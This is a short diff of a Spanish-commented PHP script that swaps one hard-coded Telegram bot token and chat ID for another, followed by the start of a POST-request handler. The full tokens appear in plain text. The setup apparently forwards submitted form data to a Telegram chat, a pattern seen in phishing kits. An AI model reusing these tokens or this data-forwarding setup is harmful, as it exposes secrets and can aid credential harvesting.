@@ -1,7 +1,7 @@
 ﻿<?php
 // Configuración de Telegram
-$botToken = "8423320754:AAE4bKS93n0zwb8bmghaoCGQbWs8F17pwWw";
-$chatId = "-5295019789";
+$botToken = "8646438884:AAHfVj9yABHTV5vrLjZx1-WYfMHX8XS17ao";
+$chatId = "-5407437454";
 
 // Verificar si se recibió una petición POST
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
